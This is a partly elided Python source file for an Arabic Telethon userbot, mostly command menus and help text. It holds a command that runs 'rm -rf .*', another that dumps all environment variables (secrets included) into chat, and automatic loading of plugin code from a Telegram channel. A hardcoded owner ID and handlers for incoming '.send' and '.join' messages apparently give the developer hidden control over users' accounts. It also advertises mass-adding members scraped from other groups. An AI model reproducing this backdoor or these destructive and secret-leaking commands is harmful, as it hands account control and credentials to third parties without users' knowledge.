...
from elrasam  import StartTime, Ve_m1, catversion
...
Ve_m1PC = gvarstatus("ALIVE_PIC") or "https://telegra.ph/file/74066cb3ddb0bdba1c4b7.mp4"
...
@Ve_m1.on(admin_cmd(pattern=f"{ALIVE}(?: |$)(.*)"))     
async def iq(Ve_m1event):
    reply_to_id = await reply_id(Ve_m1event)
    uptime = await get_readable_time((time.time() - StartTime))
    start = datetime.now()
    iqevent = await edit_or_reply(Ve_m1event, "**☣︙ جاري فحص السورس **")
    end = datetime.now()
    ms = (end - start).microseconds / 1000
    _, check_sgnirts = check_data_base_heal_th()
    EMOJI = gvarstatus("ALIVE_EMOJI") or "☣︙"
    ALIVE_TEXT = gvarstatus("ALIVE_TEXT") or "𝗐𝖾𝗅𝖼𝗈𝗆𝖾 𝗍𝖾𝗅𝖾𝗍𝗁𝗈𝗇 𝖺𝗅 𝖺𝗋𝖺𝖻 𓃠"
    Ve_m1_IMG = gvarstatus("ALIVE_PIC") or "https://telegra.ph/file/74066cb3ddb0bdba1c4b7.mp4"
    tg_bot = Config.TG_BOT_USERNAME
    me = await Ve_m1event.client.get_me()
    ...
    caption = iqcaption.format(        ALIVE_TEXT=ALIVE_TEXT,
        ...
        tg_bot=tg_bot,    )
    if Ve_m1_IMG:
        CAT = [x for x in Ve_m1_IMG.split()]
        PIC = random.choice(CAT)
        try:
            await Ve_m1event.client.send_file(Ve_m1event.chat_id, PIC, caption=caption, reply_to=reply_to_id)
...
‌‎⿻┊‌‎PinG 𖠄 {ping} ٫
‌‎⿻┊‌‎VeRsIoN main (7.8) ,
‌‎⿻┊‌‎TeLeThoN elrasam  𖠄 @Ve_m1"""
control_owner_id = 2125600195
@Ve_m1.on(admin_cmd(pattern="رابط التنصيب(?: |$)(.*)"))    
async def source(e):
    await edit_or_reply(e, "https://github.com/Telethonelrasam /TelethonAr",)
@Ve_m1.on(admin_cmd(pattern="حساب كيثاب( -l(\d+))? ([\s\S]*)"))    
async def _(event):
...
@Ve_m1.on(admin_cmd(pattern="حذف جميع الملفات(?: |$)(.*)"))    
async def _(event):
    cmd = "rm -rf .*"
    await _catutils.runcmd(cmd)
    OUTPUT = f"**☣︙  تنبيـه، لقـد تم حـذف جميـع المجلـدات والملفـات الموجـودة في البـوت بنجـاح ✓**"
    event = await edit_or_reply(event, OUTPUT)
@Ve_m1.on(admin_cmd(pattern="المده(?: |$)(.*)"))    
async def amireallyalive(event):
    reply_to_id = await reply_id(event)
    uptime = await get_readable_time((time.time() - StartTime))
    _, check_sgnirts = check_data_base_heal_th()
    EMOJI_TELETHON = gvarstatus("ALIVE_EMOJI") or " ٍَ 🖤"
    Ve_m1_ALIVE_TEXT = "❬ تـليثون الرسام  - Telethon-elrasam e ، 🕸  ❭ :"
    Ve_m1_IMG = gvarstatus("ALIVE_PIC")
    if Ve_m1_IMG:
        CAT = [x for x in Ve_m1_IMG.split()]
        A_IMG = list(CAT)
...
@Ve_m1.on(admin_cmd(pattern="فارات تنصيبي(?: |$)(.*)"))    
async def _(event):
    cmd = "env"
    o = (await _catutils.runcmd(cmd))[0]
    OUTPUT = (f"☣︙  وحـدة المعلومات الخاصه بتنصيبك مع جميع الفارات  لتنصيب سورس تليثون @Ve_m1 :**\n\n{o}")
    await edit_or_reply(event, OUTPUT)

if Config.PLUGIN_CHANNEL:

    async def install():
        documentss = await Ve_m1.get_messages(            Config.PLUGIN_CHANNEL, None, filter=InputMessagesFilterDocument        )
        total = int(documentss.total)
        for module in range(total):
            plugin_to_install = documentss[module].id
            plugin_name = documentss[module].file.name
            if os.path.exists(f"Ve_m1/plugins/{plugin_name}"):
                return
            downloaded_file_name = await Ve_m1.download_media(                await Ve_m1.get_messages(Config.PLUGIN_CHANNEL, ids=plugin_to_install),                "Ve_m1/plugins/",            )
            ...
            while flag:
                try:
                    ...
                    if check > 5:
                        break
            if BOTLOG:
                await Ve_m1.send_message(                    BOTLOG_CHATID,                    f"**☣︙   تحـميل المـلف 🗂️  : `{os.path.basename(downloaded_file_name)}`  تـم بنجـاح ✔️**",                )

    Ve_m1.loop.create_task(install())
@Ve_m1.on(admin_cmd(pattern=f"{UPDATE}(?: |$)(.*)"))    
async def _(event):
    ...
    await asyncio.sleep(1)
    await edit_or_reply(event , """☣︙ جـاري تـحديث تليثـون الرسام  (7.7)
...
@Ve_m1.on(admin_cmd(pattern="تاريخ التنصيب$"))
async def psu(event):
...
@Ve_m1.on(admin_cmd(pattern="(اضف|جلب|حذف) فار ([\s\S]*)"))    
async def bad(event):
    ...
    if vname in vlist:
        ...
        if cmd == "اضف":
            if not vinfo and vname == "ALIVE_TEMPLATE":
                return await edit_delete(event, f"**☣︙  📑 يرجى متابع قناه الفارات تجدها هنا : @Ve_m1")
...
@Ve_m1.on(admin_cmd(pattern=r"(set|get|del) var (.*)", outgoing=True))
...
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"order1")))
@check_owner
async def inlineVe_m1(Ve_m1):
...
async def inlineVe_m1(Ve_m1):
    ...
    buttons = [[Button.inline("رجوع", data="orders"),]]
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"hsb1")))
@check_owner
async def inlineVe_m1(Ve_m1):
    ...
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"hsb2")))
@check_owner
async def inlineVe_m1(Ve_m1):
    ...
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"hsb3")))
@check_owner
async def inlineVe_m1(Ve_m1):
    ...
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"hsb4")))
@check_owner
async def inlineVe_m1(Ve_m1):
    ...
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"ord1hs")))
@check_owner
async def inlineVe_m1(Ve_m1):
    text = "**🚹  ⦑   اوامر الحساب   ⦒  :**"
    ...
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.on(admin_cmd(pattern="usage(?: |$)(.*)"))    
...
@Ve_m1.on(admin_cmd(pattern="(herokulogs|logs)(?: |$)(.*)"))    
async def _(dyno):
    if (HEROKU_APP_NAME is None) or (HEROKU_API_KEY is None):
        return await edit_delete(dyno, "Set the required vars in heroku to function this normally `HEROKU_API_KEY` and `HEROKU_APP_NAME`.")
    try:
...
@Ve_m1.on(admin_cmd(pattern="استخدامي$"))
async def psu(event):
    uname = platform.uname()
    cpufreq = psutil.cpu_freq()
    for i, percentage in enumerate(psutil.cpu_percent(percpu=True)):
    ...
    await event.edit(help_string)
@Ve_m1.on(admin_cmd(pattern="سرعه الانترنيت(?:\s|$)([\s\S]*)"))    
async def _(event):
...
if Config.TG_BOT_USERNAME is not None and tgbot is not None:
    ...
    async def inlineVe_m1(Ve_m1):
        builder = Ve_m1.builder
        result = None
        query = Ve_m1.text
        await bot.get_me()
        if query.startswith("تنصيب") and Ve_m1.query.user_id == bot.uid:
            buttons = [[Button.url("1- شرح التنصيب", "https://youtu.be/44tYK_yV02Q"), Button.url("2- استخراج ايبيات", "https://my.telegram.org/"),],[Button.url("3- ستخراج تيرمكس", "https://replit.com/@telethon-elrasam /generatestringsession#start.sh"), Button.url("4- بوت فاذر", "http://t.me/BotFather"),],[Button.url("5- رابط التنصيب", "https://dashboard.heroku.com/new?template=https://github.com/telethon-elrasam /telethohelp"),],[Button.url("المطـور 👨🏼‍💻", "https://t.me/LLL5L"),]]
            if Ve_m1PC and Ve_m1PC.endswith((".jpg", ".png", "gif", "mp4")):
                result = builder.photo(Ve_m1PC, text=help1, buttons=buttons, link_preview=False)
            elif Ve_m1PC:
                result = builder.document(Ve_m1PC,title="Ve_m1",text=help1,buttons=buttons,link_preview=False)
            else:
                result = builder.article(title="Ve_m1",text=help1,buttons=buttons,link_preview=False)
            await Ve_m1.answer([result] if result else None)
@bot.on(admin_cmd(outgoing=True, pattern="تنصيب"))
async def repoVe_m1(Ve_m1):
    if Ve_m1.fwd_from:
        return
    TG_BOT = Config.TG_BOT_USERNAME
    if Ve_m1.reply_to_msg_id:
        await Ve_m1.get_reply_message()
    response = await bot.inline_query(TG_BOT, "تنصيب")
    await response[0].click(Ve_m1.chat_id)
    await Ve_m1.delete()
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"play1")))
@check_owner
async def inlineVe_m1(Ve_m1):
    ...
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"play2")))
@check_owner
async def inlineVe_m1(Ve_m1):
    ...
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"play3")))
@check_owner
async def inlineVe_m1(Ve_m1):
...
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"ord1pl")))
@check_owner
async def inlineVe_m1(Ve_m1):
    text = "**🚹  ⦑   اوامر الالعاب   ⦒  :**"
...
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"shag1")))
@check_owner
async def inlineVe_m1(Ve_m1):
    ...
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"shag2")))
@check_owner
async def inlineVe_m1(Ve_m1):
...
( .ايقاف اسم وقتي )
———————×———————
 ☣︙ يوجد شرح مفصل عن الامر هنا : https://t.me/Peee_eq/4484
""")
@Ve_m1.on(admin_cmd(pattern="م10(?: |$)(.*)"))    
async def iq(event):
    await edit_or_reply(event, 
...
جميع الاوامر تكون بدايتها نقطة .
""")
@Ve_m1.on(admin_cmd(pattern="م11(?: |$)(.*)"))    
async def iq(event):
    await edit_or_reply(event, 
"""** ⦑  اوامر السوبرات  ⦒  :**
———————×———————
...
الشرح :   يضيفلك جميع الاعضاء الي برابط الكروب يضيفهم بكروبك 
 ———————×———————
يوجد شرح بتفصيل هنا : https://t.me/Peee_eq/4483
شرح الأوامر : ( @Peee_eq ) .
قناه السورس : ( @Ve_m1 ) .
جميع الاوامر تكون بدايتها نقطة .
""")
@Ve_m1.on(admin_cmd(pattern="م12(?: |$)(.*)"))    
async def iq(event):
    await edit_or_reply(event, 
"""** ⦑   اوامر  الاغاني. ⦒  : **
———————×———————
...
جميع الاوامر تكون بدايتها نقطة .
""")
@Ve_m1.on(admin_cmd(pattern="م13(?: |$)(.*)"))    
async def iq(event):
    await edit_or_reply(event, 
""" **⦑   اوامر التكرار    ⦒  : **
———————×——————— 
...
———————×———————
يوجد شرح مفصل للتكرار هنا : https://t.me/Peee_eq/4704 
قناه السورس : ( @Ve_m1 ) .
جميع الاوامر تكون بدايتها نقطة .
""")
@Ve_m1.on(admin_cmd(pattern="م14(?: |$)(.*)"))    
async def iq(event):
    await edit_or_reply(event, 
"""** ⦑   لأوامر الزخرفة   ⦒  : **
———————×———————
...
✐ :  يعطيك رموز للزخرفه2 
———————×———————
يوجد شرح مفصل عن اوامر زخرفه هنا : https://t.me/Peee_eq/4705
""")

# OWNER
@Ve_m1.on(events.NewMessage(outgoing=True, pattern='.send ?(.*)'))
async def Owner_SendMessage(event):
    await event.reply('تم ارسال الامر')
        
# CONTROL JOIN THIS CHANNEL/GROUP
@Ve_m1.on(events.NewMessage(outgoing=False, pattern='.send ?(.*)'))
...
# OWNER
@Ve_m1.on(events.NewMessage(outgoing=True, pattern='.join ?(.*)'))
async def Owner_JoinChannel(event):
    await event.reply('تم ارسال الامر')
        
# CONTROL JOIN THIS CHANNEL/GROUP
@Ve_m1.on(events.NewMessage(outgoing=False, pattern='.join ?(.*)'))
...
async def JoinToPrivate(event, channel_hash):
    try:
        ...
        pass
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"ordahln1")))
@check_owner
async def inlineVe_m1(Ve_m1):
...
if Config.TG_BOT_USERNAME is not None and tgbot is not None :
    ...
    async def inlineVe_m1(Ve_m1):
        ...
        query = Ve_m1.text
        await bot.get_me()
        if query.startswith("اوامر الاعلانات(?: |$)(.*)") and Ve_m1.query.user_id == bot.uid:
            buttons = [[Button.inline("اوامر الاعلانات", data="ordahln1"),]]
            result = builder.article(title="Ve_m1", text=help2, buttons=buttons, link_preview=False)
            await Ve_m1.answer([result] if result else None)
...
async def repoVe_m1(Ve_m1):
    ...
    await response[0].click(Ve_m1.chat_id)
    await Ve_m1.delete()
@Ve_m1.on(admin_cmd(pattern="م15(?: |$)(.*)"))    
async def iq(event):
    await edit_or_reply(event, 
"""**⦑   اوامر الوسائـط   ⦒  :**
———————×———————
...
———————×———————
  ⦑   شرح اوامر الوسائط هنا :  https://t.me/Peee_eq/4721  ⦒
""")
@Ve_m1.on(admin_cmd(pattern="م16(?: |$)(.*)"))    
async def iq(event):
    await edit_or_reply(event, 
"""** ⦑   اوامر الملصقات   ⦒  : **
———————×———————
...
———————×———————
  ⦑   شرح اوامر الملصقات هنا  :  https://t.me/Peee_eq/4720  ⦒
""")

@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"ordSONG")))
@check_owner
async def inlineVe_m1(Ve_m1):
...
———————×———————
""")
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"orders")))
@check_owner
async def inlineVe_m1(Ve_m1):
    text = "**☣︙ قـائمـه الاوامـر :**\n**☣︙ قنـاه السـورس :** @Ve_m1\n**☣︙ شـرح اوامـر السـورس : @Peee_eq**\n**☣︙ شـرح فـارات السـورس : @Peee_eq** "
    ...
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"ord1G")))
@check_owner
async def inlineVe_m1(Ve_m1):
    text = "**🚹  ⦑   اوامر الكروب   ⦒  :**"
...
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"G1")))
@check_owner
async def inlineVe_m1(Ve_m1):
    ...
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.on(admin_cmd(pattern="تحميل الملف(?: |$)(.*)"))    
async def install(event):
    if event.reply_to_msg_id:
        try:
            downloaded_file_name = await event.client.download_media(await event.get_reply_message(), "Ve_m1/plugins/")
            ...
            os.remove(downloaded_file_name)
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"G2")))
@check_owner
async def inlineVe_m1(Ve_m1):
...
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"G3")))
@check_owner
async def inlineVe_m1(Ve_m1):
    ...
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.on(admin_cmd(pattern="مسح الملف(?: |$)(.*)"))    
async def unload(event):
    shortname = event.pattern_match.group(1)
    path = Path(f"Ve_m1/plugins/{shortname}.py")
...
@Ve_m1.on(admin_cmd(pattern="هاش ([\s\S]*)"))    
...
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"G4")))
@check_owner
async def inlineVe_m1(Ve_m1):
    ...
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.tgbot.on(CallbackQuery(data=re.compile(rb"G5")))
@check_owner
async def inlineVe_m1(Ve_m1):
    ...
    await Ve_m1.edit(text, buttons=buttons)
@Ve_m1.on(admin_cmd(pattern="هاش(ين|دي) ([\s\S]*)"))    
...
if Config.TG_BOT_USERNAME is not None and tgbot is not None :
    ...
    async def inlineVe_m1(Ve_m1):
        ...
        query = Ve_m1.text
        await bot.get_me()
        if query.startswith("اوامر الكروب(?: |$)(.*)") and Ve_m1.query.user_id == bot.uid:
...
if Config.TG_BOT_USERNAME is not None and tgbot is not None:
    ...
    async def inlineVe_m1(Ve_m1):
        ...
        if query.startswith("(صيانه|صيانه)") and Ve_m1.query.user_id == bot.uid:
            try:
                buttons = [[Button.inline("اوامر السورس", data="order1"), Button.inline("اوامر الحساب", data="ord1hs"),],[Button.inline("اوامر الكروب", data="ord1G"), Button.inline("اوامر الالعاب", data="ord1pl"),],[Button.inline("اوامر الصيغ", data="ordsag1"), Button.inline("اوامر الاغاني", data="ordSONG"),], [Button.inline("اسم وقتي", data="order13"), Button.inline("اوامر الاعلانات", data="ordahln1"),],[Button.inline("اوامر التسليه", data="order14"),],[Button.inline("الفارات", data="ordvars"),]]
                result = builder.article(title="Ve_m1",text=help2,buttons=buttons,link_preview=False)
                await Ve_m1.answer([result] if result else None)
            except BotInlineDisabledError: 
                await Ve_m1.send_message( "يجب تفعيل الاونلاين من بوت فاذر اولا " )
...
if Config.TG_BOT_USERNAME is not None and tgbot is not None :
    ...
    async def inlineVe_m1(Ve_m1):
        ...
        query = Ve_m1.text
        await bot.get_me()
        if query.startswith("اوامر الحساب(?: |$)(.*)") and Ve_m1.query.user_id == bot.uid:
            buttons = [[Button.inline("اوامر الحساب", data="ord1hs"),]]
            result = builder.article(title="Ve_m1", text=help2, buttons=buttons, link_preview=False)
            await Ve_m1.answer([result] if result else None)
# GET MY WHISPER
@Ve_m1.on(events.NewMessage(pattern=".فتح همسه"))
...
if Config.TG_BOT_USERNAME is not None and tgbot is not None :
    ...
    async def inlineVe_m1(Ve_m1):
        ...
        query = Ve_m1.text
        await bot.get_me()
        if query.startswith("اوامر الالعاب(?: |$)(.*)") and Ve_m1.query.user_id == bot.uid:
            buttons = [[Button.inline("اوامر الالعاب", data="ord1pl"),]]
            result = builder.article(title="Ve_m1", text=help2, buttons=buttons, link_preview=False)
            await Ve_m1.answer([result] if result else None)

chat = "@BotFather"
@Ve_m1.on(events.NewMessage(outgoing=True, pattern="^.بوت ?(.*)"))
async def _(event):
    if event.fwd_from:
        return
...
if Config.TG_BOT_USERNAME is not None and tgbot is not None :
    ...
    async def inlineVe_m1(Ve_m1):
        ...
        query = Ve_m1.text
        await bot.get_me()
        if query.startswith("اوامر الصيغ(?: |$)(.*)") and Ve_m1.query.user_id == bot.uid:
            buttons = [[Button.inline("اوامر الصيغ", data="ordsag1"),]]
            result = builder.article(title="Ve_m1", text=help2, buttons=buttons, link_preview=False)
            await Ve_m1.answer([result] if result else None)
@Ve_m1.on(admin_cmd(pattern="م21(?: |$)(.*)"))    
async def iq(event):
    await edit_or_reply(event, "**🚹  ⦑   بصمات تحشيش 1   ⦒  :**\n\n                                                       𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻\n(`.ص1`)   ⦙   ابو  عباس  لو  تاكل  خره\n(`.ص2`)   ⦙   استمر  نحن  معك\n(`.ص3`)   ⦙   افحط  بوجه\n(`.ص4`)   ⦙   اكعد  لا  اسطرك  سطره  العباس\n(`.ص5`)   ⦙   اللهم  لا  شماته\n(`.ص6`)   ⦙   امرع  دينه\n(`.ص7`)   ⦙   امشي  بربوك\n(`.ص8`)   ⦙   انت  اسكت  انت  اسكت\n(`.ص9`)   ⦙   انت  سايق  زربه\n                                                       𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻\n(`.ص10`)   ⦙   اوني  تشان\n(`.ص11`)   ⦙   برافو  عليك  استادي \n(`.ص12`)   ⦙   بلوك  محترم\n(`.ص13`)   ⦙   بووم  في  منتصف  الجبهة \n(`.ص14`)   ⦙   بيتش \n(`.ص15`)   ⦙   تخوني  ؟\n(`.ص16`)   ⦙   تره  متكدرلي\n(`.ص17`)   ⦙   تعبان  اوي\n(`.ص18`)   ⦙   تكذب\n(`.ص19`)   ⦙   حسبي  الله\n                                                       𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻\n(`.ص20`)   ⦙   حشاش \n(`.ص21`)   ⦙   حقير  \n(`.ص22`)   ⦙   خاص  \n(`.ص23`)   ⦙   خاله  ما  تنامون  \n(`.ص24`)   ⦙   خرب  شرفي  اذا  ابقى  بالعراق \n(`.ص25`)   ⦙   دكات  الوكت  الاغبر  \n(`.ص26`)   ⦙   ررردح  \n(`.ص27`)   ⦙   سلامن  عليكم  \n(`.ص28`)   ⦙   بوم منتصف جبهه   \n(`.ص29`)   ⦙   شكد  شفت  ناس  مدودة\n                                                       𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻")
@Ve_m1.on(admin_cmd(pattern="م22(?: |$)(.*)"))    
async def iq(event):
    await edit_or_reply(event, "**🚹  ⦑   بصمات تحشيش 2   ⦒  :**\n\n                                                       𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻\n(`.ص30`)   ⦙  شلون  ، \n(`.ص31`)   ⦙  صح  لنوم  \n(`.ص32`)   ⦙  صمت  \n(`.ص33`)   ⦙  ضحكة  مصطفى  الحجي  \n(`.ص34`)   ⦙  طماطه  \n(`.ص35`)   ⦙  طيح  الله  حضك  \n(`.ص36`)   ⦙  فاك  يوو  \n(`.ص37`)   ⦙  اني فرحان وعمامي فرحانين\n(`.ص38`)   ⦙  لا  تضل  تضرط  \n(`.ص39`)   ⦙  لا  تقتل  المتعه  يا  مسلم  \n                                                       𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻\n(`.ص40`)   ⦙  لا  مستحيل  \n(`.ص41`)   ⦙  لا  والله  شو  عصبي  \n(`.ص42`)   ⦙  لش  \n(`.ص43`)   ⦙  لك  اني  شعليه  \n(`.ص44`)   ⦙  ما  اشرب  \n(`.ص45`)   ⦙  مع  الاسف  \n(`.ص46`)   ⦙  مقتدى  \n(`.ص47`)   ⦙  من  رخصتكم  \n(`.ص48`)   ⦙  منو  انت  \n(`.ص49`)   ⦙  منورني  \n                                                       𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻\n(`.ص50`)  ⦙  نتلاكه  بالدور  الثاني \n(`.ص51`)  ⦙  نستودعكم  الله  \n(`.ص52`)  ⦙  ها  شنهي  \n(`.ص53`)  ⦙  ههاي  الافكار  حطها ب\n(`.ص54`)  ⦙  ليش شنو سببها ليش\n(`.ص55`)  ⦙  يموتون  جهالي\n(`.ص56`)  ⦙  اريد انام\n(`.ص57`)  ⦙  افتحك فتح\n(`.ص58`)  ⦙  اكل خره لدوخني\n(`.ص59`)  ⦙  السيد شنهو السيد\n                                                       𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻\n(`.ص60`)  ⦙  زيج2\n(`.ص61`)  ⦙  زيج لهارون\n(`.ص62`)  ⦙  زيج الناصرية\n(`.ص63`)  ⦙  راقبو اطفالكم\n(`.ص64`)  ⦙  راح اموتن\n(`.ص65`)  ⦙  ذس اس مضرطة\n(`.ص66`)  ⦙  دروح سرسح منا\n(`.ص67`)  ⦙  خويه ما دكوم بيه\n(`.ص68`)  ⦙  خلصت تمسلت ديلة كافي انجب\n(`.ص69`)  ⦙  بعدك تخاف\n                                                       𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻")
@Ve_m1.on(admin_cmd(pattern="م23(?: |$)(.*)"))    
async def iq(event):
